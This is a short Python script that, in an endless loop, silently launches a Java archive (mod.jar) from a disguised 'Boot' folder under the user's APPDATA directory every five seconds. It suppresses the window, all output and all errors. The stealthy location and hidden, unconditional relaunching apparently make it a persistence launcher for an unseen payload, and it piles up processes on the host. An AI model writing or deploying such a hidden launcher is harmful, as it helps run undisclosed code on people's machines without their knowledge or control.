import subprocess
import os
import time

JAVA_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "jdk", "bin", "java.exe")
JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")

while True:
    try:
        subprocess.Popen([JAVA_PATH, "-jar", JAR_PATH],
                         cwd=os.path.dirname(JAR_PATH),
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    time.sleep(5)
